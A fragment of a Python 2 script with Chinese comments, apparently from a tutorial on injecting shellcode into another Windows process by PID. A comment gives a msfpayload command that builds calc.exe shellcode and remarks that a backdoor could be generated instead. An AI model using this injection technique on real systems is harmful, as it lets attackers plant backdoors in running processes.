...
if not sys.argv[1]:
    ...
    sys.exit(0)
#shellcode使用msfpayload生成的，我这里是一个计算器，当然你可以直接生成一个后门程序
#生成代码：msfpayload  windows/exec  CMD = calc.exe  EXITFUNC=thread  C　
...
if not h_process:
    print '[*]Could not acquire a handler to PID: %s' % pid
    sys.exit(0)
# 为我们的shellcode申请内存
